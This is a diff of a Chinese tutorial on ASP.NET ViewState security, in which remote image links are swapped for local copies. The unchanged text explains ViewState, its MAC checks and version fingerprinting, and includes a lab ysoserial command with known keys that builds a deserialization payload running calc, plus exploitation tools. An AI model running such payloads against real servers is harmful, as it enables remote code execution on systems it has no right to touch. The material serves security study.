@@ -128,11 +128,11 @@ ViewState 值默认认存储在页面的隐藏字段（<input type="hidden" name
   
 第一次点击 Set Time，两个 Label 都显示当前时间  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/58HpNWd2k5icd3ZPF2YxFxZMSvZJxqIGGPMBFrYiaxC2wuy6lKljiaS3a1mgpcmxBV6W5bEvVq96xDRxPsMtRiandw/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/151657977e36f2aa3528213eab3a89e871178b605acd9433f2f7e731f10b4398.png "")  
   
 第二次点击 Set Time  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/58HpNWd2k5icd3ZPF2YxFxZMSvZJxqIGGoezShd43N9c9iawscPe4EBUv0E5plhAR2J6zj2icba2ptJechRE7PBkw/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/5aa07cd587b30aca989b6b5c83723e0f08206fb908d38310a71305ed8eb3841d.png "")  
 - With ViewState：第一次赋值已经被 ViewState 保存了，所以显示第一次的时间  
   
 - Without ViewState：第一次赋值不被保存，显示最新的时间  
@@ -158,16 +158,16 @@ ViewState MAC（消息认证码）是一种安全特性，用于验证ViewState�
   
 发送“__VIEWSTATE=AAAA”，当MAC启用时，会看到明确的MAC验证错误信息  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/58HpNWd2k5icd3ZPF2YxFxZMSvZJxqIGGPlrpxSgH7QiaVXhYuFePib043bHFh1UR6C12GSbic6iatu48xqjiaWyXicPQ/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/4df25c7857c8c0a99821c7f8517cff335c05098af4abbc2a552541d43ed762bc.png "")  
 ## 1.6. 通过 web 获取 .net 版本  
   
 通过响应头查看的.net 版本不准确，如所有 .NET 4.x 版本都显示 4.0.30319  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/58HpNWd2k5icd3ZPF2YxFxZMSvZJxqIGGhNr4MEZnzg587Qakz8XBDk00PSZmw52wtLIBZaib7szJ0Cy3O6YCeQg/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/557b11efcad6ea9e3ee60abcf2737e41b11789ec08c520af6c8e7207248ea3be.png "")  
   
 实际的版本为 4.7.3，可以在报错页面查看。这个版本影响 MAC 行为。  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/58HpNWd2k5icd3ZPF2YxFxZMSvZJxqIGGN1U0hvSNWUe7ZbDVEmT5XMBvicYicv4Kiap3Z5H9VpRRjHDnrpI3eEmDQ/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/fd53e1191e6adf25a6b84298d09c45ae045bce1a3194358a806389361a03bbdd.png "")  
   
 但如果是 .NET 2.0/3.0/3.5，报错页面都只显示 ASP.NET 版本:2.0.50727.9031   
 # 2. ViewState 的工作机制  
@@ -196,7 +196,7 @@ ASP.NET ViewState 的生成和验证流程：
   
 web 根目录下新建 web.config、login.aspx 两个文件  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/58HpNWd2k5icd3ZPF2YxFxZMSvZJxqIGGXIItK1uf4elJjHbNYJAic1gFyCHSFJ4bFribwcjWyjbgZXZ5eM5FYfoQ/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/16fc20e3ec390498bdcb394b719623dbd9fd45d8e3755ce91c9cbc93bc7e506e.png "")  
   
 web.config  
 ```
@@ -229,19 +229,19 @@ login.aspx
 ysoserial.exe -p ViewState -g TextFormattingRunProperties  --decryptionalg="AES" --validationalg="HMACSHA256" --decryptionkey="E9D2490BD0075B51D1BA5288514514AF"  --validationkey="CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF" --path="/login.aspx" --apppath="/" -c "calc" 
 ```  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/58HpNWd2k5icd3ZPF2YxFxZMSvZJxqIGGOibfcj7UO9t0lUg1s8ZH9ImDzea78JnNJicwtJN9bl6UsgclhlcvmyZA/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/80a7e514a1285ae13edc91ef8437331ac5e5977c1933c4eaf7dc440c8a0f116b.png "")  
   
 点击登陆，然后替换__VIEWSTATE的值为生成的序列化值  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/58HpNWd2k5icd3ZPF2YxFxZMSvZJxqIGGnPGMkowZQagJjdw3qc8xezIf3p55p244x5xDE0hzVnEObsbULFBCZw/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/3fa536e27d734f359533b8dc8449bb063f5c06fcbc7a1d056e4397280d7a1412.png "")  
   
 服务端收到 ViewState 字符串后，base64 解码 > MAC 验证成功（攻击者有正确的validationKey）> 数据解密 > 成功（攻击者有正确的decryptionKey） > 反序列化触发漏洞（执行 calc 命令）。  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/58HpNWd2k5icd3ZPF2YxFxZMSvZJxqIGGxOUyib4NL89KGtm5yVM9iaf4t7FkSVTz6ibxqRHFib7cibrQ9ia0mRgwtD9w/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/fca462f155949d64c823afec604ab52e3a95747b43323c3fb9a636a8b75af91b.png "")  
 # 4. 相关工具  
 ## 4.1. ViewState Editor  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/58HpNWd2k5icd3ZPF2YxFxZMSvZJxqIGGJAtn2p9wCWcWvUos9fbiakkYEBiafqWxibvqO1onP9C2F2wUvMxd4DiaIw/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/42c190f14ddb1e4e48c5669297876163515fdc3c91373ce377b1f62fbf59d98b.png "")  
 ## 4.2. Deserialization Scanner  
   
 burpsuite 插件  
